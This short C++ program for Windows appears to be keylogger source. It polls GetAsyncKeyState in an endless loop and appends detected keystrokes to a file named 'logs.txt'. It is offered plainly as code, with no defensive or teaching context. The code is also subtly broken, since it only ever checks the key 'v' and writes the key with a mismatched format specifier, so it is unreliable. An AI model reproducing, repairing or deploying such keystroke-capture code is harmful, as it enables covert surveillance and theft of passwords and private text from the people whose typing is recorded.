#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS_GLOBALS

const int __Key_Is_Pressed__ = -32767;
const char* __FILE_NAME__ = "logs.txt";

using namespace std;

int Save(int _Key, const char *file);

int main() {
	char i = 'v';

	while (true) {
		for (int j = 8; j <= 255; j++) {
			if (GetAsyncKeyState(i) == __Key_Is_Pressed__ ) {
				Save(i, __FILE_NAME__);
			}
		}
	}


	return 0;
}

int Save(int _Key, const char *file)
{
	cout << _Key << endl;

	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "%s", &_Key);
	fclose(OUTPUT_FILE);

	return 0;
}
